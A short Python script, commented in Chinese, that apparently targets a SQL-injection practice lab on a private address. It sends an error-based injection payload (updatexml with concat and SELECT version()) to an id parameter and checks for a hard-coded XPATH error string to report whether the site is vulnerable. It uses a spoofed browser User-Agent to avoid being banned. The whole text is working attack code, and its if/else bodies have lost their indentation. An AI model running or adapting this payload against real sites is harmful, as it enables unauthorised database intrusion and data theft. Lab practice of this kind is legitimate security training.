import requests

# 手动设置漏洞链接

url = "http://192.168.148.155/Less-1/?id=1"

# 设置 headers 头，告诉服务器请求的客户端是什么类型的设备或应用程序，有些服务器可能会根据User-Agent字段来做特定的处理，例如根据设备类型返回不同的内容或应用不同的限制策略，避免被 ban

headers = {'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"}

# 构造 SQL 语句，查询数据库版本

payload = "' AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)) AND 'utgs'='utgs"

# 发送HTTP请求，注入 payload 并获取页面响应

res = requests.get(url + payload,  headers=headers, timeout = 5)

# 若 res 返回的响应中存在 "XPATH syntax error: '~5.5.44-0ubuntu0.14.04.1~'" 则证明存在漏洞，否则不存在

if "XPATH syntax error: '~5.5.44-0ubuntu0.14.04.1~'" in res.text:

print('[+]Vulnerable to SQL injection: ' + url)

else:

print('[-] Not Vulnerable: ' + url)